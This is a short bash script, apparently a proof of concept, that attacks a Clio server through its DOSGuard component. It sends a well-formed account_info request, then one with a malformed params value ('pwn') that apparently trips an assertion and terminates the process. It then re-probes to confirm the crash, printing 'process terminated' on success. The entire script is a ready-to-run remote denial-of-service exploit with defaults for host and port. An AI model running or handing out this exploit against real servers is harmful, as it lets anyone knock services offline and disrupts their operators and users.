#!/usr/bin/env bash
# Clio DOSGuard reachable assertion, single-request remote process termination.
#
# Preconditions on the target:
#   server.__ng_web_server = true   (or -w on the command line)
#   dos_guard.__ng_weights contains at least one method entry

HOST="${1:-127.0.0.1}"
PORT="${2:-51233}"
TARGET="http://${HOST}:${PORT}/"

echo "[*] target        $TARGET"

echo "[*] control       params: [{}]  (well-formed, should be served)"
CTRL=$(curl -s -o /dev/null -w '%{http_code}' -m 5 -X POST "$TARGET" \
        -H 'Content-Type: application/json' \
        -d '{"method":"account_info","params":[{}]}' 2>/dev/null)
echo "    HTTP ${CTRL:-no response}"

if [ -z "$CTRL" ] || [ "$CTRL" = "000" ]; then
    echo "[-] no response to the control request; target not reachable or not serving"
    exit 2
fi

echo "[*] payload       params: \"pwn\"  (present, not an array of objects)"
curl -s -o /dev/null -m 5 -X POST "$TARGET" \
     -H 'Content-Type: application/json' \
     -d '{"method":"account_info","params":"pwn"}' 2>/dev/null
echo "    sent"

sleep 2

echo "[*] verify        re-probing with the control request"
AFTER=$(curl -s -o /dev/null -w '%{http_code}' -m 5 -X POST "$TARGET" \
         -H 'Content-Type: application/json' \
         -d '{"method":"account_info","params":[{}]}' 2>/dev/null)

if [ -z "$AFTER" ] || [ "$AFTER" = "000" ]; then
    echo "    no response"
    echo "[+] process terminated, assertion reached, std::exit(EXIT_FAILURE)"
    exit 0
else
    echo "    HTTP $AFTER"
    echo "[-] still serving: target is patched, or __ng_weights is empty,"
    echo "    or the legacy web server is in use (it normalises params first)"
    exit 1
fi
